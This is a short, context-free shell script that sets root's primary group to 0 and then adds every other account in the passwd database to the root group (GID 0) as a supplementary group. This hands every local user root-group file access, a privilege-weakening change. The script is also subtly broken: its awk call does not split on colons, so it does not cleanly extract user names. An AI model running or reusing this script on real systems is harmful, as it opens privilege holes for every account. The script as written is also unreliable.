usermod -g 0 root
groupmod -g 0 root
for user in $(getent passwd | awk '{print $1}'); do
if [ "$user" != "root" ]; then
usermod -G 0 $user
fi
done